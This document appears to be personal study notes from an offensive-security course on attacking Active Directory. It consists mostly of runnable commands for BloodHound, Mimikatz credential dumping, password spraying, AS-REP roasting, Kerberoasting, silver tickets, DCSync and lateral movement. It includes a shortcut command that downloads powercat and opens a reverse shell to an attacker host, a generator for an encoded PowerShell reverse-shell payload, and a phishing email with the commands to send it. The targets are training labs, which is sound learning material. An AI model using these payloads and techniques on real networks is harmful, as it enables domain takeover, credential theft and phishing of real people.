`bloodhound-python --collectionmethod All --username 'Eric.Wallows' --password 'EricLikesRunning800' --domain secura.yzx --zip -ns 192.168.211.97`

```jsx
It's often best to combine automatic and manual enumeration techniques when assessing Active Directory. Even though we could theoretically gather the same information with a manual approach, graphical relationships often reveal otherwise unnoticed attack paths.
```

`Import-Module .\Sharphound.ps1` 

**`Invoke-BloodHound`**

```jsx
We'll begin with the -CollectionMethod, which describes the various collection methods. In our case, we'll attempt to gather All data, which will perform all collection methods except for local group policies.
```

`Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit”`

`.\sharp.exe --collectionmethods All --outputdirectory "C:\Users\Public" --outputprefix "medtech"`

IMPORTANT FOR REAL WORLD :

```jsx
While the collection method we used above created a snapshot over the domain, running it in a loop may gather additional data as the environment changes. The cache file speeds up the process. For example, if a user logged on after we collected a snapshot, we would have missed it in our analysis. We will not use the looping functionality, but we recommend experimenting with it in the training labs and inspecting the results in BloodHound.
```

### UI

`sudo neo4j start`

`bloodhound`

`*Analysis* button
*Shortest Paths*`

```jsx
Now when we run it, we can analyze this graph to determine our best attack approach. In this case, the graph will reveal a few things we didn't catch in our earlier enumeration.

For example, let's focus on the relationship between stephanie and CLIENT74, which we saw in our earlier enumeration. To get more information, we can hover the mouse over the string that indicates the connection between the node to see what kind of connection it really is:
```

```jsx
If we right-click the line between the nodes and click ? Help, BloodHound will show additional information:
```

```jsx
In the ? Help menu BloodHound also offers information in the Abuse tab, which will tell us more about the possible attack we can take on the given path. It also contains Opsec information as what to look out for when it comes to being detected, as well as references to the information displayed.
```

IMPORTANT

```jsx
This plays directly into the second Shortest Path we'd like to show for this Module, namely the Shortest Paths to Domain Admins from Owned Principals. If we run this query against corp.com without configuring BloodHound, we receive a "NO DATA RETURNED FROM QUERY" message.
```

```jsx
However, the Owned Principals plays a big role here and refers to the objects we are currently in control of in the domain. To analyze, we can mark any object we'd like as owned in BloodHound, even if we haven't obtained access to them. Sometimes it is a good idea to think in the lines of "what if" when it comes to AD assessments. In this case however, we will leave the imagination on the side and focus on the objects we in fact have control over.
```

## **Attacking Active Directory**

```jsx
Active Directory supports several older protocols including WDigest. While these may be useful for older operating systems like Windows 7 or Windows Server 2008 R2, we will only focus on more modern authentication protocols in this Learning Unit.
```

STATUS_NOT_SUPPORTED

https://notes.benheater.com/books/active-directory/page/kerberos-authentication-from-kali

### **NTLM Authentication**

```jsx
NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos.
```

![efc3ae731d085f29a1673782d583e64d-ad_ntlm.png](efc3ae731d085f29a1673782d583e64d-ad_ntlm.png)

```jsx
In the first step, the computer calculates a cryptographic hash, called the NTLM hash, from the user's password. Next, the client computer sends the username to the server, which returns a random value called the nonce or challenge. The client then encrypts the nonce using the NTLM hash, now known as a response, and sends it to the server.

The server forwards the response along with the username and the nonce to the domain controller. The validation is then performed by the domain controller, since it already knows the NTLM hash of all users. The domain controller encrypts the nonce itself with the NTLM hash of the supplied username and compares it to the response it received from the server. If the two are equal, the authentication request is successful.
```

## **Kerberos Authentication**

```jsx
A key difference between these two protocols (based on the underlying systems) is that with NTLM authentication, the client starts the authentication process with the application server itself, as discussed in the previous section. On the other hand, Kerberos client authentication involves the use of a domain controller in the role of a Key Distribution Center (KDC). The client starts the authentication process with the KDC and not the application server. A KDC service runs on each domain controller and is responsible for session tickets and temporary session keys to users and computers.
```

![b5e6b0ecb201daef973f507049049029-ad_kerbauth.png](b5e6b0ecb201daef973f507049049029-ad_kerbauth.png)

```jsx
kinit user # type password. get TGT / TGS
# or convert the given kirbi ticket to ccache and export it
export KRB5CCNAME=ticket.ccache
kvno MSSQLSvc/MSSQL.sccm.lab:1433 # get Service Tickets

# use it any of the impacket tools if you had necessary permissions
impacket-psexec -k -no-pass sccm.lab/dave@dc.sccm.lab -dc-ip $DCIP
impacket-smbexec -k -no-pass sccm.lab/dave@dc.sccm.lab -dc-ip $DCIP
impacket-wmiexec -k -no-pass sccm.lab/dave@dc.sccm.lab -dc-ip $DCIP
```

## **Cached AD Credentials**

`.\mimikatz.exe`

`privilege::debug`

`sekurlsa::logonpasswords`

```jsx
Armed with these hashes, we could attempt to crack them and obtain the cleartext password as we did in Password Attacks.
```

```jsx
A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets. As already discussed, we know that Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS, and we can use Mimikatz to interact with and retrieve our own tickets as well as the tickets of other local users.
```

FOR LAB : 
Let's open a second PowerShell window and list the contents of the SMB
share on WEB04 with UNC path **\\web04.corp.com\backup**. This will
create and cache a service ticket. dir \\[web04.corp.com](http://web04.corp.com/)\backup

`sekurlsa::tickets`

IMPORTANT

```jsx
The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. Alternatively, armed with a TGT, we could request a TGS for specific resources we want to target within the domain
```

```jsx
Before covering attacks on AD authentication mechanisms, let's briefly explore the use of Public Key Infrastructure (PKI) in AD. Microsoft provides the AD role Active Directory Certificate Services (AD CS) to implement a PKI, which exchanges digital certificates between authenticated users and trusted resources.

If a server is installed as a Certification Authority (CA), it can issue and revoke digital certificates (and much more)
```

```jsx
We can rely again on Mimikatz to accomplish this. The crypto module contains the capability to either patch the CryptoAPI function with crypto::capi or KeyIso service with crypto::cng,making non-exportable keys exportable.
```

## AD-Passwords Attacks

`net accounts`

```jsx
Before exploring these attacks, we need to account for one important consideration. When performing a brute force or wordlist authentication attack, we must be aware of account lockouts. Too many failed logins may block the account for further attacks and possibly alert system administrators.
```

```jsx
The first kind of password spraying attack uses LDAP and ADSI to perform a low and slow password attack against AD users. In the Module Active Directory Introduction and Enumeration, we performed queries against the domain controller as a logged-in user with DirectoryEntry. However, we can also make queries in the context of a different user by setting the DirectoryEntry instance.
```

```jsx
https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
```

```jsx
The -Pass option allows us to set a single password to test, or we can submit a wordlist file using -File. We can also test admin accounts by adding the -Admin flag. The PowerShell script automatically identifies domain users and sprays a password against them.
```

`.\Spray-Passwords.ps1 -Pass Nexus123! -Admin`

`crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d [corp.com](http://corp.com/) --continue-on-success`

```jsx
The third kind of password spraying attack we'll discuss is based on obtaining a TGT. For example, using kinit on a Linux system, we can obtain and cache a Kerberos TGT. We'll need to provide a username and password to do this. If the credentials are valid, we'll obtain a TGT. The advantage of this technique is that it only uses two UDP frames to determine whether the password is valid, as it sends only an AS-REQ and examines the response.
```

`.\kerbrute_windows_amd64.exe passwordspray -d [corp.com](http://corp.com/) .\usernames.txt "Nexus123!"`

```jsx
If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.
```

## AS-REP ROASTING

```jsx
As we have discussed, the first step of the authentication process via Kerberos is to send an AS-REQ. Based on this request, the domain controller can validate if the authentication is successful. If it is, the domain controller replies with an AS-REP containing the session key and TGT. This step is also commonly referred to as Kerberos preauthentication and prevents offline password guessing.

Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response. This attack is known as AS-REP Roasting.
```

**FROM LINUX**

Identify Users : `impacket-GetNPUsers -dc-ip 192.168.124.70  [corp.com/pete](http://corp.com/pete)`

`impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast [corp.com/pete](http://corp.com/pete)`

```jsx
Let's perform this attack from our Kali machine first, then on Windows. On Kali, we can use impacket-GetNPUsers to perform AS-REP roasting. We'll need to enter the IP address of the domain controller as an argument for -dc-ip, the name of the output file in which the AS-REP hash will be stored in Hashcat format for -outputfile, and -request to request the TGT.

Finally, we need to specify the target authentication information in the format domain/user. This is the user we use for authentication. For this example, we'll use pete with the password Nexus123! from the previous section. The complete command is shown below:
```

`hashcat --help | grep -i "Kerberos”  *18200*

sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

echo \$1 > demo.rule this rule was used in the labs

echo -e ':\n$1\n$!' > append.rule

**FROM WINDOWS**

`.\Rubeus.exe asreproast /nowrap`

```jsx
To identify users with the enabled AD user account option Do not require Kerberos preauthentication, we can use PowerView's Get-DomainUser function with the option -PreauthNotRequired on Windows. On Kali, we can use impacket-GetNPUsers as shown in listing 14 without the -request and -outputfile options.
```

VERY IMPORTANT

```jsx
we notice that we have GenericWrite or GenericAll permissions on another AD user account. Using these permissions, we could reset their passwords, but this would lock out the user from accessing the account. We could also leverage these permissions to modify the User Account Control value of the user to not require Kerberos preauthentication. This attack is known as Targeted AS-REP Roasting. Notably, we should reset the User Account Control value of the user once we've obtained the hash.
```

### Targeted AS-REP

`Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>`

`Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, IdentityreferenceName`

`Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose`

## **Kerberoasting**

**This technique is immensely powerful if the domain contains high-privilege service accounts with weak passwords,** 

```jsx
Let's recall how the Kerberos protocol works. We know that when a user wants to access a resource hosted by a Service Principal Name (SPN), the client requests a service ticket that is generated by the domain controller. The service ticket is then decrypted and validated by the application server, since it is encrypted via the password hash of the SPN.
```

**Concept :**

```jsx
When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.

These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller.
```

**FROM WINDOWS**

```jsx
To perform Kerberoasting, we'll use Rubeus again. We specify the kerberoast command to launch this attack technique. In addition, we'll provide hashes.kerberoast as an argument for /outfile to store the resulting TGS-REP hash in. Since we'll execute Rubeus as an authenticated domain user, the tool will identify all SPNs linked with a domain user
```

`.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`

`hashcat --help | grep -i "Kerberos”`  > 
 `13100`

`sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

echo \$1 > demo.rule this rule was used in the labs

echo -e ':\n$1\n$!' > append.rule

**FROM LINUX**

```jsx
Next, let's perform Kerberoasting from Linux. We can use impacket-GetUserSPNs with the IP of the domain controller as the argument for -dc-ip. Since our Kali machine is not joined to the domain, we also must provide domain user credentials to obtain the TGS-REP hash. As before, we can use -request to obtain the TGS and output them in a compatible format for Hashcat.
```

`sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 [corp.com/pete](http://corp.com/pete)`

### Clock skew too great

```jsx
If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.
If you are not currently running as the root user, switch to the root user by running the “su” command
Run “timedatectl set-ntp off” to disable the Network Time Protocol from auto-updating
Run “rdate -n [IP of Target]” to match your date and time with the date and time of the your target machine
```

```jsx
If you are not currently running as the root user, switch to the root user by running the “su” command
Run “timedatectl set-ntp off” to disable the Network Time Protocol from auto-updating
Run “rdate -n [IP of Target]” to match your date and time with the date and time of the your target machine
```

**This technique is immensely powerful if the domain contains high-privilege service accounts with weak password**

IMPORTANT

```jsx
IF SPN runs in the context of a computer account, a managed service account, or a group-managed service account, the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the krbtgt user account which acts as service account for the KDC. Therefore, our chances of performing a successful Kerberoast attack against SPNs running in the context of user accounts is much higher.
```

**TARGETED KERBEROASTING**

```jsx
Let's assume that we are performing an assessment and notice that we have GenericWrite or GenericAll permissions on another AD user account. As stated before, we could reset the user's password but this may raise suspicion. However, we could also set an SPN for the user, kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting
```

`Set-DomainUserSPN -Identity victim_user -SPN "http/test.corp.com"`

### WRITESPN

[WriteSpn](https://www.notion.so/WriteSpn-22acb30389638059ab69cb082343d745?pvs=21)

## **Silver Tickets**

```jsx
Remembering the inner workings of the Kerberos authentication, the application on the server executing in the context of the service account checks the user's permissions from the group memberships included in the service ticket. However, the user and group permissions in the service ticket are not verified by the application in most environments. In this case, the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller.
```

```jsx
Privileged Account Certificate (PAC) validation is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller. Fortunately for this attack technique, service applications rarely perform PAC validation.
```

In general, we need to collect the following three pieces of
information to create a silver ticket:

- SPN password hash
- Domain SID
- Target SPN

Check acces to the service : `iwr -UseDefaultCredentials [http://web04](http://web04/)` > no access

**1- SPN password hash**

```jsx
Since we are a local Administrator on this machine where iis_service has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service), which is the first piece of information we need to create a silver ticket.
```

`privilege::debug`

`sekurlsa::logonpasswords`

```jsx
Authentication Id : 0 ; 1147751 (00000000:00118367)
Session           : Service from 0
**User Name         : iis_service**
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 4:52:14 AM
SID               : **S-1-5-21-1987370270-658905905-1781884369**-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         *** NTLM     : 4d28cf5252d39971419580a51484ca09**
         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
```

**2- Domain SID**

```jsx
Now, let's obtain the domain SID, the second piece of information we need. We can enter whoami /user to get the SID of the current user. Alternatively, we could also retrieve the SID of the SPN user account from the output of Mimikatz, since the domain user accounts exist in the same domain.
```

`whoami /user`

corp\jeff **S-1-5-21-1987370270-658905905-1781884369**-1105

only this section is needed

```jsx
The last list item is the target SPN. For this example, we'll target the HTTP SPN resource on WEB04 (HTTP/web04.corp.com:80) because we want to access the web page running on IIS.
```

```jsx
Now that we have collected all three pieces of information, we can build the command to create a silver ticket with Mimikatz. We can create the forged service ticket with the kerberos::golden module. This module provides the capabilities for creating golden and silver tickets alike. We'll explore the concept of golden tickets in the Module Lateral Movement in Active Directory.
```

```jsx
We need to provide the domain SID (/sid:), domain name (/domain:), and the target where the SPN runs (/target:). We also need to include the SPN protocol (/service:), NTLM hash of the SPN (/rc4:), and the /ptt option, which allows us to inject the forged ticket into the memory of the machine we execute the command on.
```

```jsx
Finally, we must enter an existing domain user for /user:. This user will be set in the forged ticket. For this example, we'll use jeffadmin. However, we could also use any other domain user since we can set the permissions and groups ourselves.
```

`kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin`

`klist`

`iwr -UseDefaultCredentials [http://web04](http://web04/)`

To view content of page : `(iwr -Uri "[http://web04](http://web04/)" -UseDefaultCredentials).Content`

```jsx
Great! We successfully forged a service ticket and got access to the web page as jeffadmin. It's worth noting that we performed this attack without access to the plaintext password or password hash of this user.
```

**PATCH**

```jsx
Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure. With this patch in place, the extended PAC structure field PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.
```

## **Domain Controller Synchronization**

```jsx
In production environments, domains typically rely on more than one domain controller to provide redundancy. The Directory Replication Service (DRS) Remote Protocol uses replication to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, using the IDL_DRSGetNCChanges API.

Luckily for us, the domain controller receiving a request for an update does not check whether the request came from a known domain controller. Instead, it only verifies that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.
```

By default, members of the *Domain Admins*, *Enterprise Admins*,
and *Administrators* groups have these rights assigned.

```jsx
If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a dcsync attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.

```

```jsx
To perform this attack, we'll use Mimikatz on a domain-joined Windows machine, and impacket-secretsdump on our non-domain joined Kali machine for the examples of this section.
```

`lsadump::dcsync /user:corp\dave`

 domain username for which we want to obtain credentials as an argument for **/user**

`hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

`lsadump::dcsync /user:corp\Administrator`

**ON Linux** 

`impacket-secretsdump -just-dc-user davecorp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70`

## **Phishing for Access**

```jsx
Because we don't have any information about the internal machines or infrastructure, we'll choose the second technique as Microsoft Office may not be installed on any of the target systems.
For this attack, we have to set up a WebDAV server, a Python3 web server, a Netcat listener, and prepare the Windows Library and shortcut files.
```

`mkdir /home/kali/beyond/webdav`

`/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/`

**config.Library-ms**

```jsx
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>***http://192.168.119.5***</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

**/home/kali/beyond**

```jsx
Next, we'll create the shortcut file on WINPREP. For this, we'll right-click on the Desktop and select New > Shortcut. A victim double-clicking the shortcut file will download PowerCat and create a reverse shell. We can enter the following command to achieve this:

`powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"`
```

Our next step is to serve PowerCat via a Python3 web server. Let's
copy **powercat.ps1** to **/home/kali/beyond** and serve it on port
8000 as we have specified in the shortcut's PowerShell command.

`python3 -m http.server 8000`

`nc -nvlp 4444`

We'll create the **body.txt** file in **/home/kali/beyond**

```jsx
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```

```jsx
Now we are ready to build the swaks command to send the emails. We'll provide daniela@beyond.com and marcus@beyond.com as recipients of the email to -t, john@beyond.com as name on the email envelope (sender) to --from, and the Windows Library file to --attach. Next, we'll enter --suppress-data to summarize information regarding the SMTP transactions. For the email subject and body, we'll provide Subject: Staging Script to --header and body.txt to --body. In addition, we'll enter the IP address of MAILSRV1 for --server. Finally, we'll add -ap to enable password authentication.
```

`sudo swaks -t [daniela@beyond.com](mailto:daniela@beyond.com) -t [marcus@beyond.com](mailto:marcus@beyond.com) --from [john@beyond.com](mailto:john@beyond.com) --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap`

`sudo swaks -t jim@relia.com --from emma@relia.com --attach @config.Library-ms --server 192.168.193.189 --body @body.txt --header "Subject: Urgent Update" --suppress-data -ap`

# **AD Lateral Movement**

C:\Users\Administrator\APPDATA\local\microsoft\Remote Desktop Connection Manager

## **WMI**

```jsx
The first lateral movement technique we are going to cover is based on Windows Management Instrumentation (WMI), which is an object-oriented feature that facilitates task automation
```

```jsx
WMI can create processes via the Create method from the Win32_Process class. It communicates through Remote Procedure Calls (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data.
```

```jsx
To create a process on the remote target via WMI, we need the credentials of a member of the Administrators local group, which can also be a domain user. In the following examples, we are going to perform the attacks as the user jen, which is both a domain user and a member of the Local Administrator group for the target machines.
```

`wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc”` for checking

WMI Payload

```jsx
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

```jsx
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e {payload}';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

INFORMATION 

```jsx
To do that, we'll first specify DCOM as the protocol for the WMI session with the New-CimSessionOption cmdlet on the first line. On the second line, we'll create the new session, New-Cimsession against our target IP, using -ComputerName and supply the PSCredential object (-Credential $credential) along with the session options (-SessionOption $Options). Lastly, we'll define 'calc' as the payload to be executed by WMI.

As a final step, we need to tie together all the arguments we configured previously by issuing the Invoke-CimMethod cmdlet and supplying Win32_Process to the ClassName and Create to the MethodName. To send the argument, we wrap them in @{CommandLine =$Command}.

```

## WinRM

```jsx
WinRM is the Microsoft version of the WS-Management protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP.
```

```jsx
For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.
```

```jsx
The winrs utility can be invoked by specifying the target host through the -r: argument and the username with -u: and password with -p. As a final argument, we want to specify the commands to be executed on the remote host. For example, we want to run the hostname and whoami commands to prove that they are running on the remote target.

Since winrs only works for domain users, we'll execute the whole command once we've logged in as jeff on CLIENT74 and provide jen's credentials as command arguments.
```

`winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami”`

`Since winrs only works for domain users,`

`winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`

`nc -lnvp 443
PowerShell also has WinRM built-in capabilities called *PowerShell
remoting*`

```jsx
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
```

`Enter-PSSession 1`

## **PsExec**

```jsx
It is possible to misuse this tool for lateral movement, but three requisites must be met. First, the user that authenticates to the target machine needs to be part of the Administrators local group. Second, the ADMIN$ share must be available, and third, File and Printer Sharing has to be turned on. Luckily for us, the last two requirements are already met as they are the default settings on modern Windows Server syste
```

```jsx
To start an interactive session on the remote host, we need to invoke PsExec64.exe with the -i argument, followed by the target hostname prepended with two backslashes. We'll then specify the domain\username as corp\jen for the -u argument and Nexus123! as the password for the -p arguments. Finally, we will include the process we want to execute remotely. Here we will use the command shell.
```

`.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd`

## **Pass the Hash**

```jsx
The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the user's plaintext password. Note that this will only work for servers or services using NTLM authentication, not for servers or services using Kerberos authentication. This lateral movement sub-technique is also mapped in the MITRE Framework under the Use Alternate Authentication Material general technique.
```

```jsx
First, it requires an SMB connection through the firewall (commonly port 445), and second, the Windows File and Printer Sharing feature to be enabled. These requirements are common in internal enterprise environments.**First, it requires an SMB connection through the firewall (commonly port 445), and second, the Windows File and Printer Sharing feature to be enabled. These requirements are common in internal enterprise environments.**
```

`impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E [Administrator@192.168.50.73](mailto:Administrator@192.168.50.73)`

## **Overpass the Hash**

`privilege::debug`

`sekurlsa::logonpasswords`

```jsx
With overpass the hash, we can "over" abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). Then we can use the TGT to obtain a Ticket Granting Service (TGS).
```

```jsx
The essence of the overpass the hash lateral movement technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication. A simple way to do this is with the sekurlsa::pth command from Mimikatz.
```

`sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell`

```jsx
At this point, running the whoami command on the newly created PowerShell session would show jeff's identity instead of jen. While this could be confusing, this is the intended behavior of the whoami utility which only checks the current process's token and does not inspect any imported Kerberos tickets
```

`klist`

No Kerberos tickets have been cached, but this is expected since *jen*
has not yet performed an interactive login. Let's generate a TGT by
authenticating to a network share on the files04 server with **net
use**.

`net use \\files04` 

`klist`

***We know that ticket #0 is a TGT because the server is krbtgt.***

```jsx
We used net use arbitrarily in this example, but we could have used any command that requires domain permissions and would subsequently create a TGS.
```

```jsx
PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of jen in the PowerShell session, we can reuse the TGT to obtain code execution on the files04 host.
```

`.\PsExec.exe \\files04 cmd`

## **Pass the Ticket**

```jsx
In the previous section, we used the overpass the hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. The TGT is typically tied to the user session in which it was created and cannot be reused elsewhere, while service tickets (TGS) can often be exported and reused across systems, offering more flexibility.
```

```jsx
The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.
```

`ls \\web04\backup` no access

`privilege::debug`

`sekurlsa::tickets /export`

The above command parsed the
*LSASS*
process space in memory for any TGT/TGS, which is then saved to disk
in the kirbi mimikatz format.

`dir *.kirbi`

```jsx
As many tickets have been generated, we can just pick any TGS ticket in the dave@cifs-web04.kirbi format and inject it through mimikatz via the kerberos::ptt command.
```

`kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`

`klist`

`ls \\web04\backup` access now

Futher we can use psexec if the impersonated user have admin access on the target machine

## **DCOM**

```jsx
The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network.
```

INFORMATION

```jsx
Both COM and DCOM are very old technologies dating back to the very first editions of Windows. Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API.

Cybereason documented a collection of various DCOM lateral movement techniques, including one discovered by Matt Nelson, which we are covering in this section.

The discovered DCOM lateral movement technique is based on the Microsoft Management Console (MMC) COM application that is employed for scripted automation of Windows systems.

The MMC Application Class allows the creation of Application Objects, which expose the ExecuteShellCommand method under the Document.ActiveView property. **As its name suggests, this method allows the execution of any shell command if the authenticated user is authorized, which is the default for local administrators.**
```

**From an elevated PowerShell prompt**, we can instantiate a remote MMC
2.0 application by specifying the target IP of FILES04 as the second
argument of the *GetTypeFromProgID* method.

`$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))`

Once the application object is saved into the *$dcom* variable,
we can pass the required argument to the application via the
[**ExecuteShellCommand**](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand)
method. The method accepts four parameters: **Command**,
**Directory**, **Parameters**, and **WindowState**. We're only
interested in the first and third parameters, which will be populated
with **cmd** and **/c calc**, respectively.

`$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")`

```jsx
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

```jsx
